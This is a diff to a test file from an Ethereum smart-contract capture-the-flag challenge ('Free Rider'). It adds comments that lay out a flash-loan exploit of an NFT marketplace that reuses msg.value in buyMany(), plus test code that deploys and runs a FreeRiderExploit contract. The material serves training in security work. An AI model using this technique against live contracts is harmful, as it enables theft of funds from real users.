@@ -103,8 +103,26 @@ describe('[Challenge] Free Rider', function () {
         );
     });
 
+    // ------------------------------------------ EXPLOIT ------------------------------------------
+    // 1. Get a 15 ETH flash loan from Uniswap pool
+    // 2. Exploit NFT marketplace by buying all tokens using 'buyMany()'
+    //      - NFT marketplace only checks for msg.value
+    //      - msg.value remains the same for all buys
+    //      - Marketplace transfers the NFT to the buyer
+    //      - Now the buyer is the owner of the NFT 
+    //      - Marketplace sends ETH from the NFT purchase to the token owner, which is also the buyer
+    //        due to the previous step
+    //  3. Send all NFTs to buyer contract to collect ETH reward
+    //  4. Repay flash loan with ETH received from step (2)
+    // ---------------------------------------------------------------------------------------------
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const FreeRiderExploit = await ethers.getContractFactory('FreeRiderExploit', deployer);
+        this.exploit = await FreeRiderExploit.deploy();
+        await this.exploit.connect(attacker).exploit(
+            this.uniswapPair.address, 
+            this.marketplace.address, 
+            this.buyerContract.address)
+        ;
     });
 
     after(async function () {
